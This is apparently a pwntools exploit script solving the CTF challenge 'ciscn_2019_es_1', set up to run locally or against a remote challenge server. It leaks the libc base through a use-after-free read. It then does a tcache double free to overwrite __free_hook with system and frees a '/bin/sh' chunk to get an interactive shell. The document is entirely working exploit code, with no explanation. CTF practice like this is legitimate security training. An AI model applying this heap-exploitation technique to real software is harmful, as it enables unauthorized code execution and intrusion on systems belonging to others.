import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_es_1')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_es_1')
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
		else :
			io=remote('node3.buuoj.cn',28650)
			elf=ELF('./ciscn_2019_es_1')
			libc=ELF('../../x64libc/libc.so.6')

		def add(a,b,c):
			io.sendlineafter('choice:','1')
			io.sendlineafter('name\n',str(a))
			io.sendafter('name:\n',b)
			io.sendafter('call:\n',c)

		def show(a):
			io.sendlineafter('choice:','2')
			io.sendlineafter(':\n',str(a))

		def delete(a):
			io.sendlineafter('choice:','3')
			io.sendlineafter(':\n',str(a))

		add(0x500,'a','a')
		add(0x30,'a','a')
		delete(0)
		show(0)
		io.recv(6)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x10
		libc.address=libc_base
		delete(1)
		delete(1)
		add(0x30,p64(libc.sym['__free_hook']),'aaaa')
		add(0x30,'/bin/sh\x00','aaaa')
		add(0x30,p64(libc.sym['system']),'aaaa')
		delete(3)
		success('libc_base:'+hex(libc_base))


		#gdb.attach(io)
		#pause()
		io.interactive()